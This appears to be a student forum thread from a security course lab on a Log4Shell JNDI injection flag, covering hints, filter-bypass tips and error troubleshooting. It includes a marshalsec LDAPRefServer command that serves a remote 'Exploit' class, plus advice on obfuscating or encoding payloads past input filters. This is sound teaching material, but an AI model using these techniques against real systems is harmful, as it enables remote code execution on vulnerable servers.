customerservice@gatech.edu is the default email that gets injected by the system. This doesn't live in the database, hence querying by it doesn't return results. 

It's a red herring for this flag


4
Reply

Gantabya Kadel
2d
 Replying to Joel M Tucker
I’m not querying by this email. 
What I’m saying is that for some reason after restarting the container my post request just does not store the email value in the db. 
And if I pull all of the records the email shown is that default email. 
I’m fairly certain that this is not expected behavior ? 


Reply

Gantabya Kadel
2d
 Replying to Gantabya Kadel
nvm I got the flag this whole question is moot. The query didn't give me anything because I forgot that email was being queried via query param and obviously encoded values change there .... 😔 


1
Reply

Gantabya Kadel
3d

Resolved
is it a good sign if I'm getting a tea pot error because the body for my post contains ip pattern ? 


Reply

Keymer Botero
3d
Keep charging forward! Use the techniques you've learned in other flags to bypass the set restrictions! (Vague due to policies!)


Reply

Maxim Olatoye
4d

Resolved
If you are stuck on 'Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest' the reason might not be obvious. I kept running into this message simply because my payload was over-obfuscated, even though it worked for previous flags. If you're facing the same problem, try using minimal obfuscation, just enough to bypass the teapot.


6
Reply

Joel M Tucker
4d
Yep. Good tip!


Reply

John Wyatt Gamble
3d
This is frustrating. I am definitely calling my exploit from data at rest but keep getting this error.


3
Reply

Sean Kenneth Weber
4d

Resolved
When fetching a single product by record ID, will leveraging query parameters work? I am leveraging query parameters, confirmed that the config file is being updated with the product ID that I am calling the GET method with, and confirmed that the config file is only being updated (not overwritten). Would the reason for this be because a query parameter does not count as "data at rest"?


Reply

Joel M Tucker
3d
You can trigger the call using several methods and strategies used in previous flags. 
But you won't get the flag unless you trigger the call from data that has been persisted (data at rest)


1
Reply

Tosin Ajayi
4d

Resolved
is this part of the log useful?

WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.


Reply

Joel M Tucker
4d
yep, this is useful

See https://edstem.org/us/courses/69023/discussion/6222726?comment=14565084


Reply

Tosin Ajayi
4d
Thanks for your response. Just 3 follow up questions - I see a part in the task that says "You will have to inspect the logs of each of the endpoints to come up with a successful attack strategy." 
Q1: Are we to run all the 4 endpoints and inspect their logs or specific end points?
Q2: What parts of the logs should we focus on being that the logs are much?
Q3: My LDAP server is on this path /home/log4j/Desktop/log4shell/target. I wanted to be sure that it is in order?


Reply

Kevin Xia
3d
 Replying to Tosin Ajayi
1. Yes. It’s recommended to look at all of the requests and their logs.
2. Focus on the things that can be exploited; at this point on Flag6 you should be able to determine which log patterns are problematic.
3. this can be answered in the setup docs i think


Reply

Joel M Tucker
3d
 Replying to Kevin Xia
these tips ARE useful, thanks


1
Reply

Gantabya Kadel
3d
Joel, your response here is confusing. 

You had said we could ignore this warning perviously here ? 

https://edstem.org/us/courses/69023/discussion/6222726?comment=14565084

or am I just not reading this right ?


Reply

Joel M Tucker
3d
 Replying to Gantabya Kadel
hm, you're right Gantabya, my mistake. This error can be ignored.


Reply

Ramoya Grandison
5d

Resolved
Day 4 and counting…..so my Post server hits successfully, and then when i run the email endpoint the server hits, it says JNDI has to be done at data at rest. Then i go to the other get, and the server hits again but no flag - only the irrelevant error. 

What am i missing? Would the Post fire if my jndi was not done correctly?


Reply

Joel M Tucker
4d
Make sure the data at rest is correct and avoid overdoing the obfuscation.


Reply

Ramoya Grandison
4d
When you say make sure the data are rest is correct, do you mean am i getting the stored email value i set in the beginning? If so, the emails are the same


Reply

Joel M Tucker
4d
 Replying to Ramoya Grandison
I mean the call should be triggered by the data at rest, if it is not well formed it won't trigger the ldap call. Additionally, if there is too much obfuscation, it won't trigger the call


Reply

Minh Giang
4d
Think about it like this, there's something else that is presented in the logs that share something similar to your injection. Think about how you can manipulate your post data to match it.  


4
Reply

Denis Kasapovic
5d

Resolved
I just want to make sure I understand the order of things:

       1.Post to retrieve id and create payload.

       2.Then I compile the Java file? 

            a. I am testing with it compiled and I am seeing my payload

            b. I am testing not complied and getting a "foo" message.

Seems the 1st route the code runs, but there is no flag. I guess this makes sense since how would I know the product ID.  

2nd route I am unable to get to run since the code is not compiled until after I retrieve the product ID. I am leaning towards the 2nd route since the flag is supposed to be retrieved with a GET method. So, does that mean I can ignore the “foo message” and continue looking for the GET method?


Reply

Joel M Tucker
5d
I'm not completely getting the question here, but you'll need to trigger the flag with data at rest, meaning that data will need to be saved first. It will take a couple of curl calls (one POST and one GET) to get the flag


Reply

Denis Kasapovic
4d
Ok, I think I was wasting time trying to figure out why I was seeing the "reference class foo" error.  And that was due to not having the exploit compiled prior making the POST call. Seems like I can ignore and move on, and try finding the 2nd  GET call to return the flag.


Reply

Nicholas Angel Bear
5d

Resolved
Just got this flag, and it wasn't too bad! It builds on what we previously did for Flag 4 and Flag 5. I did not use obfuscation, but I did use encoding.

As many have mentioned, doing a single POST request and studying the log output helps a lot. See if there's anything that reminds you of the previous flags for constructing your payload.

Once that's done, finding the endpoint to grab your persisted data is relatively easy since we have a small set of APIs to use.


4
Reply

Ashutosh Agarwal
5d
Nice work!


Reply

Shimin Zhang
5d

Resolved
Finally solved it... If you’re stuck like I was, don’t make the same silly mistake: you need a GET request to retrieve the flag! Even if your POST triggers the exploit, the flag won’t appear until you fetch the data.


4
Reply

Kevin Darlington
5d
Nice work!


Reply

Ruangsak Patomwong
5d

Resolved
I can trigger the exploit from rest data but the flag is not generated.


Reply

Ruangsak Patomwong
5d
there is no flag generator for my expected GET endpoint but I think there is one endpoint that can trigger the data from REST


Reply

Ashutosh Agarwal
5d
You'd need to use the correct GET endpoint to generate the flag. 


1
Reply

Kevin Darlington
5d
You cannot get this flag the same way as the other flags (Using REST). You need to craft your attack in a way that when your data is retrieved from the backend it triggers the exploit. 


1
Reply

Ruangsak Patomwong
5d
Finally got the flag!!! If the script is execute when POST then don't worry, just figure how to. make it execute with the right GET endpoint.


Reply

Kevin Xia
5d

Resolved
is there a way to programmatically set the malignant product id or are we supposed to hardcode it in our java class?


Reply

Rahul Nair
5d
hardcoding will get the job done


2
Reply

Kevin Xia
5d
yup thanks, got the flag


Reply

Ramoya Grandison
5d

Resolved
I got my GET to run and trigger the server listening but it still doesn’t give the flag so I am assuming the issue is where I am injecting for post. Just to clarify, the post when successful should also trigger a 200 on the server? And outside of the Id, am I expected to include that other field in my curl? 


Reply

Kevin Darlington
5d
Yes that would be my guess. I would strongly recommend playing with the POST data with plain old strings and see how they map to the other endpoints. 


Reply

David Song Huang
5d

Resolved
I have an idea of which GET request to call to get the exploit to run, but am having trouble setting the field I need to query for this to happen. Is there any resource on how to accomplish this? The field I'm trying to set and query keeps getting reset to the default.


Reply

David Song Huang
5d
Nvm. I solved it. Hopefully this is vague enough but if you get to this step, understand how URL encoding works. 


Reply

Owen Duvall
5d

Resolved
I'm running into an issue where a certain POST request and certain GET requests are taking forever to run. Restarting the container doesn't seem to fix it, and neither does restarting the VM. I ran the top command to look at the metrics of the currently running processes, and it doesn't seem like anything is taking significant CPU or memory resources. Does anyone have any insight as to what could be going wrong here? I feel like I'm close to getting the flag, but this is making it difficult to tell.


1
Reply

Robert Morgan Gryder
5d
Are these requests running exploits? Maybe your Java code is running indefinitely/stuck in a loop and blocking the request from completing?


Reply

Owen Duvall
5d
That's the idea, but I'm not seeing any requests coming through on the LDAP server either, so I don't think the code is being run.


Reply

Joel M Tucker
5d
You can post privately with the screenshots of what you're doing. This is the second time we've heard this, could be an edge case.

The general advice, however, would be to restart the container. It could be that db connection pool is full and connection requests are timing out if you're hitting it too much


2
Reply

Owen Duvall
5d
Sounds good, thanks. I'll make a private post. 

I suspect that may not be what's happening here. Even if I restart the container, the requests I make still take a long time to execute.


Reply

Robert Perry
5d
I'm running into this issue as well.


Reply

Joel M Tucker
5d
 Replying to Robert Perry
make sure your value for price in the form data is an integer. Avoid using decimals here


3
Reply

Alexander Rodgers
4d
 Replying to Joel M Tucker
omg I was running into this issue for a while. Changing to an integer fixed it for me as well.


Reply

Le Tao
5d

Resolved
Both the POST endpoint and two of the GET endpoints (except for the sole one that throws the error: the customer.service.email property is not in config.properties or overwriting file instead of updating it) will reset config.properties file every time they are called, due to not inputing an exploit payload or doesn't match the keyword expected by the project . I verified that the file gets updated with the product.id and sets customer.service.email to example@example.com via the sole GET endpoint. I also checked in root mode with Flag2 to ensure the file isn’t reset. Then retrieved the result by email endpoint, but it only shows that the record was found.

I thought I share the same points with this useful comment:

https://edstem.org/us/courses/69023/discussion/6222726?comment=14468963

But since I didn’t capture the flag, I think I might be wrong and on the wrong track...


Reply

Joel M Tucker
5d
So this is a gap with our service. Thank you for bringing it up to our attention. 

Prior to this semester we used the /products endpoints for Flag3 but that has since moved to /cartoons endpoints. We missed removing this error logging flow. 

The error "Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties or overwriting file instead of updating it" error isn't relevant for Flag 6. You can ignore this.



4
Reply

Le Tao
5d
Thank you for clarification! The product.id triggers the flag. If the email isn’t modified in config.properties, it resets to the default email with each request except the post one. How the new added email be retrieved? (Its id is exactly the written product.id)

I also saw your reply below this comment. Perhaps I missed something. I'll have a review.

-----------

Finally captured the flag. Just a heads-up: the email in API response is a "fake" one (default email). DO NOT try to make API return the correct inserted email.


3
Reply

Ashley Tanner
5d
I definitely feel like this comment should be pinned because this error threw me for a loop for 2 days.


1
Reply

Joel M Tucker
5d
 Replying to Ashley Tanner
I can't pin comments but feel free to link if you see anyone else asking about this


Reply

Ramoya Grandison
6d

Resolved
I just have one clarifying question, for my exploit file, is the only thing being added the product.id or do we also need to add something for the email?


Reply

Ashutosh Agarwal
5d
only the product.id property needs to be added in the config.properties file.


2
Reply

Swapnanil Ray
6d

Resolved
Here's my two cents after spending a day on this:

Make sure you do a post request just to test how is it working. Understand the logs very well. What is happening to the data, that you just posted? Is something happening to it? 

Once you identify a pattern, beautifully design the payload! So much so, that this would probably be the craziest car to exist 🙏 



3
Reply

Van Hien Tran
5d
Hi, I think I got that POST part and design the payload to insert my LDAP. However, after that when I trigger with GET endpoints, nothing happened. I observed there is a GET endpoint with suspicious variable but I still don't know how it's related to the data at rest. Can you give any hint about the GET endpoint to trigger? or both will work fine if my POST payload correct?


Reply

Van Hien Tran
5d
I reached to the point when I curl the specific GET endpoint, it logged the LDAP server. However it seems not trigger it.  Any idea


Reply

Swapnanil Ray
5d
 Replying to Van Hien Tran
Your JNDI lookup worked, but the flag did not generate, is that what you mean? Are you sure, your exploit is doing what is expected from it?


Reply

Van Hien Tran
5d
 Replying to Swapnanil Ray
I mean I can see the LDAP server url got printed in the log. However, the server is not hit.

[UPDATE] i got it thanks


Reply

Amrut Bhalchandra Kulkarni
7h
This is where I'm at

Mind giving some vague sagely wisdom?


Reply

Keymer Botero
6d

Resolved
Okay, so not sure if I am missing anything but, aren't we addressing product.id? I'm receiving the following warning message:

WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.

Last I checked according to the writeup, we were updating the product.id into there as an addition property.
Some comments are suggesting to another GET endpoint. Not sure which one yet but will report back if I find anything.
Could someone clarify this? I feel so close! 
It's really late, I'm going to hop off for now, but any intervention to clarify things would be much appreciated!


Reply

Thomas Leopold Kroll
6d
Endorsed
I wouldn't read too much into that error, I got it on a lot of my failed attempts. The endpoints they give you are all you need. 
Have you watched the office hours? It saved me from thinking too much into it


3
Reply

Keymer Botero
5d
I see, thank you for actually coming back to this thread and letting me know Thomas. I’ll check out the office hours as soon as I can and update this post ASAP after that.


Reply

Joel M Tucker
5d
You can ignore this error for Flag 6. It doesn't mean anything


Reply

Keymer Botero
3d
Thank you Joel and Thomas. I'm noticing a couple things after rewatching Office Hours 1.

After carefully inspecting rather the log, I'm seeing a new variable that I believe Minh's comment was referring to. Tried messing with that and got nowhere as there is an extra colon that I can't seem to get rid of. 

Just as additional notes, I am using as minimal Obsfucation techniques as I can and I understand that the attack should be happening on the data at rest. I am going to re-read some other posts before Office Hours 2 but any other ideas?

EDIT: Just to make sure I am understanding the directions properly, we need to overwrite the existing product.id of our malicious 'vehicle' with any id that we set ourselves? Having trouble understanding this part.


Reply

Keymer Botero
3d
 Replying to Keymer Botero
UPDATE: So close! Just got this message 

2025-03-05 03:42:44 [ProductService.java:73] WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

I swear I feel like I'm so close but I can see why this would not be considered Data at rest since I'm TECHNICALLY using the GET to do something for me... 

The thing that confuses me is that I’m not the one technically putting it together (if TAs know what I mean).

Going to tune off for work tomorrow but any advice or idea how close I actually am? Or maybe there’s something I’m perhaps overlooking. 


Reply

David J Munoz Jr.
6d

Resolved
Just got the flag and wanted to summarize some hints that helped me to achieve this in case there are still others that are struggling.

1. Check the logs for your post request, this can provide super valuable information on proceeding with the exploit: https://edstem.org/us/courses/69023/discussion/6222726?comment=14478856

2. Construct the payload, (we've seen this in previous flags)

3. You can refer to this post for the java code: https://edstem.org/us/courses/69023/discussion/6222726?comment=14534876

4. There are many posts saying the same thing such as if you receive this email error, try the other GET endpoint. This post in particular helps when you do find the right endpoint: https://edstem.org/us/courses/69023/discussion/6222726?comment=14544550

Hope that helps without sharing too much (this post does some very vague as with most other posts providing hints) but if you stick to these points, you will be able to get the flag.


3
Reply

Anonymous Mouse
6d

Resolved
I read what other say about this property but I'm at a loss. "WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it."


Reply

Corey Cunningham
6d

Resolved
I am creating a product with an email, when I create that product the log value results in my exploit being run.

The same exploit should be run when I get the product by email due to the way things are being logged.

however when I call ?email=<the email I created> I just get an empty list, despite that the return value of when I create the product has the email I created.

I am encoding the email param query and it is showing in the logs to be what I think it should be


Reply

Corey Cunningham
6d
lol I'm so dumb, was missing a character on my email query param


Reply

Matthew Joseph Claar
6d

Resolved
Can someone add clarity as to why the LDAP call being made as soon as the initial record is created is not considered data at rest? Done with this flag, but not quite grasping why Create record --> record stored & processed --> LDAP call != restful, but record stored --> user makes query --> LDAP call IS restful. Thanks!


Reply

Jesse Lee Dotson
6d
This is just my impression from doing the assignment but I think it has to do with the fact that the exploit exists inside the system in an inactive state, ie it's "resting."

 A significant implication is that its activation can be disconnected in time from its insertion, and in our case the activation is a normal act. So if an update was made that made it impossible to successfully inject an LDAP call when creating a record, it might not prevent that exploit from executing. Or it could be laid as a trap, and execute when some specific victim does an innocuous task.


Reply

Joel M Tucker
6d
Yeah this is right. “Data at rest” refers to data that has been persisted to some form of storage (in this case a database). This is opposed to “Data in Transit” which would cover data being sent as an http request for example.

Triggering of the ldap call for most of the flags in this project would be “Data in Transit” because you are introducing a malicious payload and triggering an exploit with data in motion from an http request.

This flag focuses on the scenario of what happens when your system is logging data, not from a request coming from the outside, but from a “trusted” database? We often tend to guard the controllers and entry point layers very carefully, validating xss and http headers and params. But there can also be risk from malicious data that has already been introduced and is just sitting in storage “at rest”.


1
Reply

Thomas Leopold Kroll
7d

Resolved
I'm curious what the clerk at DMV would say if I tried to register this car. 

I agree with the other poster that the method for this one was interesting!

I don't think I have anything to add for hints, but the office hours helped to keep me from going down a crazy path.


1
Reply

Robin J Hicks
7d

Resolved
Friendly reminder: if you're confident you have everything in the right place with the right values and you're still not getting the flag, restart your container. I spent hours debugging a working exploit just to learn it was something hosed up in the lab environment. 

Also, remember the IDs do not persist a restart so you will need to re-insert your record before re-running the exploit.

Other than that annoyance, very interesting take on the exploit!


1
Reply

Reese Michael Olsen
3d
I encountered something very similar that displayed an extensive String traceback. Restarting the container worked for me. 


Reply

Robert Birk Hughes
1w

Resolved
I am having a similar issue as someone below.  I keep getting:Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

However, this is coming from one of my curl commands at one of the GET endpoints, not the post.  The jndi lookup is correctly happening from the data that is at rest when I use the GET endpoint, and the config file properties are properly being updated.  Am I missing something here?  I don't understand the error message in my context.


Reply

Robert Birk Hughes
1w
I am 99.9% sure that I am using the correct vector and storing the exploit properly in the database.  I am getting numerous calls to my exploit script when I curl the GET endpoint and the properties is being properly updated.  Yet I still get the "must come form data at rest" error even though my exploit is coming from the data that is at rest in the database and nothing I put into the curl command


Reply

Robert Birk Hughes
1w
Finally figured it out.  <redacted> The fact my exploit was called from a GET method and did what it was supposed to do, yet not give me the flag, seems contrary to the instructions on the flag and was a massive headache, and clearly not just for me.


Reply

Joel M Tucker
1w
 Replying to Robert Birk Hughes
We'll take this feedback and see how we can make the logging more clear but still keep the spirit of the challenge. Part of the learning is understanding why obfuscation is what it is and when and how it is used.


1
Reply

Rex Kovara Belli
2d
 Replying to Joel M Tucker
Any tips here?  I'm at the same spot, and it's frustrating to be fighting the tooling and not the material.

Edit: Got it.  If you're stuck at the same spot, see comment here: https://edstem.org/us/courses/69023/discussion/6222726?comment=14472334


Reply

Brandon Shreve
1w

Resolved
The derp approach saved the day :) Thanks for the office hours!  


1
Reply

Kevin Darlington
1w
Nice work and no problem! :)


Reply

Harry Arther Staley
6d
DERP_x approach for the win.

Also logging "TOTAL PWNAGE, I LOVE IT!!!" helps me. 


1
Reply

Robert Maness
1w

Resolved
Just got this one. Personally, I think this is the coolest and most satisfying flag of the week. Thought I was insane when I noticed the attack vector, but HOLY SCHNIKES it worked. 

My tips: 

Don't worry if your email value keeps getting reset to the default - if you make the proper call searching for the one you originally set, it will still work. 

If it feels like your POST attempts are getting blocked by endless teapots, I suggest reassessing your approach. You're probably headed in the wrong direction like I was. 

Pay very close attention to the way that the logs handle your record's values as you play with each of the endpoints. There might just be a creative way you can sneak your exploit in there. 

If your code looked anything like mine for the previous flags, you should be able to get away with basically copying over your Flag 5 script and changing as little as one line. 


2
Reply

Anjali Chablani
1w
Many thanks Robert. Your tips made a difference. I got the flag. 


Reply

Ashutosh Agarwal
1w
Nice work! Thanks for sharing!


Reply

Andrew Naughton
2d
really got me over the finish line here. thanks Robert!


Reply

Jake Leggore
1w

Resolved
Hint: Find the least amount of obfuscation you can use to bypass the checkers. For some reason, too much obfuscation (even if it works) will prevent you from getting the flag.


3
Reply

J. Kendall Miller
1w

Resolved
I believe I am understanding data at rest. I have persisted the data and the trigger, and run the get request but still get. Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest


Reply

Anonymous Barracuda
1w
I have been stuck at the same point for like 4 days.


Reply

J. Kendall Miller
1w
Yah. Some people say it isn't important if the POST data insert also triggers the exploit, as long as the GET triggers it. Don't know if that is a key or not, to get the POST to not trigger and only the GET, but I don't think that is possible..


Reply

Joel M Tucker
1w
 Replying to J. Kendall Miller
The POST should not be triggering the attack. The point is for the trigger to be coming from data that has been persisted


Reply

J. Kendall Miller
1w
 Replying to Joel M Tucker
Turning off the listener will resolve that for the POST, so it doesn't trigger, and will be at rest, but issuing the GET doesn't get the flag. Same error as above.


1
Reply

J. Kendall Miller
1w
 Replying to J. Kendall Miller
I also see that some say that the exploit runs a bunch of times, but it shouldn't affect whether you get the flag, but others say that you need to keep it from running so many times. Confusing! My thought is that none of those things should be a factor in getting the flag.


Reply

J. Kendall Miller
1w
 Replying to J. Kendall Miller
Does anyone have a different process to getting the flag? Seems like I have tried everything.


Reply

Robert Birk Hughes
1w
 Replying to Joel M Tucker
My POST is not triggering the attack, only the GET, yet I am still getting the same error message as above


Reply

J. Kendall Miller
1w
 Replying to Robert Birk Hughes
So I was able to finally get the flag. This morning I spotted a pattern of where to inject my exploit. Take your time and get it right. The way I did it, my final POST request was not obfuscated, I just needed it to fit the pattern. My GET request needed URL encoding to not get an error. I hope I'm not sharing too much, but enough to help you and those that are struggling. I still think the POST request triggered the exploit, but the GET request finally gave the flag after a couple tries.


6
Reply

Linh-Dan Le
1w
 Replying to J. Kendall Miller
Second this! I didn't use any obfuscation for my post and figuring out the correct pattern was the gist of this flag. 


Reply

David Robert Nygren
1d
 Replying to Linh-Dan Le
Confused what you mean by pattern. I looked at how different things are stored and see no pattern.


Reply

Linh-Dan Le
1d
 Replying to David Robert Nygren
Maybe try looking at the server logs for one of the commands, and see if you can find a variable there that has some pattern (concat).


Reply

Anonymous Badger
1d
 Replying to J. Kendall Miller
I have done this exact thing and injected the same working malicious trigger but now my ldap server isn't firing? I am almost 100% certain I found the internal variable where we just need to use its pattern and make our POST req params fit the trigger but im not sure why the server wouldnt be firing now with the same trigger 


Reply

Linh-Dan Le
1d
 Replying to Anonymous Badger
My guess is you're not formatting the url correctly, you might need an extra "$"


Reply

Anjali Chablani
1w
I am really stuck for the last 4 days. Pretty much everything I have tried is also getting resolved in POST method. The JNDI command is getting resolved in POST. What am I missing here? Turning off the listener during POST makes it not trigger. However  executing GET command does not result in obtaining the flag. I am getting an message "Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest." Any pointers appreciated. 


Reply

Robert Maness
1w
I'd suggest going back through the endpoints and looking specifically at how the logs are handling/outputting the record values that you created. Is there something you notice? Maybe some way you could sneak your LDAP call in there?


Reply

Daniel Alexander Moreno
1w

Resolved
Don't do what I did as I apparently had the right answer two days ago. Here's my two hints

Just because a GET endpoint mentions the flag, doesn't mean that it is the right endpoint. Look through all of the logs for all of the endpoints the instructions mention.

Before you edit config.properties, make sure you print it out and replicate the formatting properly because that was my issue for a very long time.


1
Reply

Joel M Tucker
1w
Great tips


Reply

Anonymous Kudu
1w

Resolved
From the setup instructions I have ran this in the terminal:

cd ~/Desktop/log4shell/target

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:4242/#Exploit"
I see that its listening but I never seem to get any logs to come through? is this typically normal? I feel like I should be seeing logs come through here when commands get sent to the ldap server.. wondering if I'm on the wrong track with this one and will only see logs come through on tail -f cs6035.log


Reply

Kevin Darlington
1w
You will only see this server log when your jndi request fires. If your jndi request isn't correct, it won't log anything. 


Reply

Cooper Michael Simpson
1w

Resolved
I feel like I know what to do but I keep getting

`2025-02-27 07:47:16 [ProductService.java:41] WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.`

And cannot update my config.properties. How can i overcome this? Spent sooo many hours on this now T__T


Reply

Anonymous Barracuda
1w
Try using the other get endpoint instead.


Reply

Cooper Michael Simpson
1w
YES, got it. idk why the other didn't work though..


Reply

Linh-Dan Le
1w
Interesting that only one endpoint works but not the other. 


Reply

Benjamin Burrell Weaver
1w

Resolved
What issues can cause my LDAP server to be hit but not ping the http server on the same port?
I can get the LDAP server to be hit both in POST and in GET but neither on triggers the exploit.


Reply

Kevin Darlington
1w
My guess would be your payload isn't correct. 


1
Reply

Benjamin Burrell Weaver
1w
You would be correct, make sure to add /Exploit to the end of your payload ha


1
Reply

Kevin Darlington
1w
 Replying to Benjamin Burrell Weaver
Nice work! Yeah, that is very important as it is what you are requesting the ldap to get for you :)


Reply

Sean Chen
1w

Resolved
interesting one


2
Reply

Sean Chen
1w

Resolved
did anyone face the issue where the POST call freezes? It doesn't seem like entering in the info any other way triggers the exploit.


1
Reply

Sean Chen
1w
a slight update. Just waiting here thinking, the traces are slowly showing up. still odd that entering it this way spends so much more time than normal. my computer cpu and memory usage didn't spike


Reply

Anonymous Tapir
1w
The same thing happened to me. Some GET requests are just stalling with no responses as well.


Reply

Joel M Tucker
1w
There shouldn't be any intensive processes. It's a simple crud application. Try restarting the container


Reply

Matthew Ruiz
1w
Any updates on this? I'm running into the same issue


Reply

Anonymous Red panda
1w
I ran into this same issue as well. I'm not 100% sure this was the cause but I was playing around with how I was obfuscating things and one of my POSTs slowed down to a crawl and it never recovered after that. I ended up just rebooting the VM and restarting everything. 


Reply

Owen Duvall
6d
I'm running into the same issue. POST and certain GET requests are taking forever to run. Restarting the container didn't seem to fix it. From looking at the running processes, it doesn't seem like anything is taking significant CPU/memory resources. Did anyone have any luck with getting around this? 


Reply

Justin Cong
4d
Thanks for posting this, glad it wasn't just me. Still trying to get past it (restarted container as well), and I was trying to find other places for the exploit before I saw your post


Reply

Cheng-Kai Zhang
2d
did you finally pass it? tried restart container but it stays the same for me...


Reply

Michael Joseph Hearn
1w

Resolved
I spent all day on this flag...our hacks have looked like !((STUFF:STUFF2:STUFF3))  etc. If you don't have STUFF unmodified stored in the database it will fail. It's not possible to get this flag otherwise.  


1
Reply

Bari Belhadj
1w

Resolved
I got the flag but I honestly don't understand why the more obvious way doesn't work. It does the same exact thing that the intended method does, yet it won't work?

I think the message "must come from data at rest" and the emphasis on "data at rest" is just confusing and is throwing everyone off. If a new product is created with the payload, isn't that basically "data at rest" ? if not, what is the definition of "data at rest" exactly? 

To everyone stuck with this. I'd advice that you create a new product and watch the logs.  If you are updating a product instead, just make sure you change something in the body every time and watch the logs.


Reply

Bari Belhadj
1w
Of course after posting this I did some reading about "Data at rest" and, well, it makes sense now 🤣 .

I will just leave this here: https://en.wikipedia.org/wiki/Data_at_rest


1
Reply

Kevin Darlington
1w
Nice work and thanks for sharing!


1
Reply

Nicolas Bautista
1w
I still think your post is valid though Bari. There is a way to store the string payload at rest through the POST request that successfully exploits through a secondary GET call. However, it can still fail and you don't get the flag because it wasn't exactly how the author intended, even though it does technically meet all of the requirements for the flag as specified in the github page.


6
Reply

Alois Maier
1w

Resolved
pretty sure i'm on the final part but i want to make sure i didn't go down a bad path.

I can write a post that will trigger sending my payload. I was stuck for a while on how I can access my lookup via a GET because nothing in the GET's seemed to be able to call where my payload resides from the POST. That was until just recently I saw something in the logs that looks like it should be holding my payload so I just need to find how I can call it. But it looks like it's relating to something that we've had very little work on in this so far in this class so I'm not sure I should devote a lot of time to this method if it's incorrect.

Ultimately my question would be, is flag 7 relevant to this flag at all?


Reply

Ashutosh Agarwal
1w
No, flag 7 is not related to this flag.


Reply

Alois Maier
1w
so can i assume i'm on the wrong path of wanting to utilize sql in some way in this flag?


Reply

Ashutosh Agarwal
1w
 Replying to Alois Maier
yes, sql is not required for this flag.


Reply

Alois Maier
1w
 Replying to Ashutosh Agarwal
and do we have to find any hidden endpoints or the flag just uses the 4 provided in the writeup?


Reply

Ashutosh Agarwal
1w
Endorsed
 Replying to Alois Maier
No hidden endpoints, just the 4 mentioned in the write up are relevant for this flag. 


2
Reply

Ruangsak Patomwong
1w

Resolved
The email has been reset every time. Then I cannot GET the payload to execute script. is that normal?


Reply

Ashutosh Agarwal
1w
Yes, you need to figure out the correct GET endpoint to retrieve the malicious data from the database and trigger the exploit.


Reply

Hailey Robinson
1w

Resolved
Make sure you restart the container regularly if you make several products with the same email, it will avoid some unnecessary confusion :')


1
Reply

Ruangsak Patomwong
1w
Does the email has been reset every time? Should I worry about email reset?


Reply

Hailey Robinson
1w
No, I just mean I created several products with the same email during the trial and error phase and then used GET by email and didn't realize I was receiving at one of my older products without the updated exploit


1
Reply

Joel M Tucker
1w
that's a valid way to reset. The DB is in memory, good tip!


1
Reply

Alois Maier
1w

Resolved
anyone get "IP address pattern detected in request body" when making their POST?


2
Reply

John Michael McPhillips
1w
There are a few ways around this


1
Reply

Jordan Tannenbaum
4d
You mind sharing some? I tried converting to decimal, hex, etc which gets past this issue, but it isn't executing in the get request.

AFAIK, I am using the correct POST format and I am using the correct GET call since I can see my JNDI call in that GET's logs. 


Reply

John Michael McPhillips
4d
 Replying to Jordan Tannenbaum
In my solution I used DNS. This requires an additional exploit step prior to executing your GET to get the flag, because the server will need to have the record. It might be too much if you are unfamiliar with doing something like that.


Reply

Jordan Tannenbaum
4d
 Replying to John Michael McPhillips
Thanks! I ended up doing something a lot simpler, but I did get some extra reading on DNS out of this!


Reply

Ruangsak Patomwong
1w

Resolved
Does the default payload in POST request provide us enough key-value pairs to get this flag or we need to add more?


Reply

John Michael McPhillips
1w
I got the flag using the example key:value from the doc


2
Reply

Ruangsak Patomwong
1w
Do you have to change the value or you can leave them as it is?


Reply

John Michael McPhillips
1w
 Replying to Ruangsak Patomwong
This should be helpful. https://edstem.org/us/courses/69023/discussion/6222726?comment=14459922 

The goal is to have your exploit triggered by the data at rest.


Reply

Ruangsak Patomwong
1w
 Replying to John Michael McPhillips
I think I can picture the direction I should go. Next step is to ask question to myself what do I do.


Reply

Daniel Alexander Moreno
1w
 Replying to Ruangsak Patomwong
Wish I could help, but I have no idea. I figured out the id thing, but I can't figure out how to save data that will be printed by both GETs since only one GET logs the contents of the retrieved records.


1
Reply

Ruangsak Patomwong
1w
 Replying to Daniel Alexander Moreno
From my observation, there is only one GET that contains log about flag. It might be something to be done with that.


Reply

Daniel Alexander Moreno
1w
 Replying to Ruangsak Patomwong
Yeah, my only reason for thinking that it needs to work in both GETs are https://edstem.org/us/courses/69023/discussion/6222726?comment=14460225 and https://edstem.org/us/courses/69023/discussion/6222726?comment=14471965. There's also disagreement about whether it is a good thing if POST triggers the exploit (https://edstem.org/us/courses/69023/discussion/6222726?comment=14488466 and https://edstem.org/us/courses/69023/discussion/6222726?comment=14484570).


Reply

Ruangsak Patomwong
1w
 Replying to Daniel Alexander Moreno
I hit a wall here and no idea what to do next.


Reply

Joel M Tucker
1w
 Replying to Daniel Alexander Moreno
It doesnt need to work in both GETS. Pay attention to the logs. Pay attention to the logical steps of when the actual call is getting triggered. 


Reply

Daniel Alexander Moreno
1w
 Replying to Joel M Tucker
Yeah, I know that the exploit needs to execute after the reset and before the read. I just can't find a log I control which is printed between those two operations.


Reply

Himanshu Singh
2d
 Replying to Daniel Alexander Moreno
Did you find one?


Reply

Daniel Alexander Moreno
2d
 Replying to Himanshu Singh
Yes, I did. I recommend reading https://edstem.org/us/courses/69023/discussion/6222726?comment=14529309 as it turns out I was on the wrong track.


Reply

Daniel Alexander Moreno
1w

Resolved
Are there any hints on how to retrieve the id's value so that it can be inserted into the properties file per "You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated"?


Reply

Ashutosh Agarwal
1w
Once you create a product using the POST endpoint, you will get the product id value in the api response. 


Reply

Daniel Alexander Moreno
1w
Well, I already knew that the GET requests would return the id so I suppose that means I need to focus on the update part of the instructions.


Reply

Xiaohua Cai
1w

Resolved
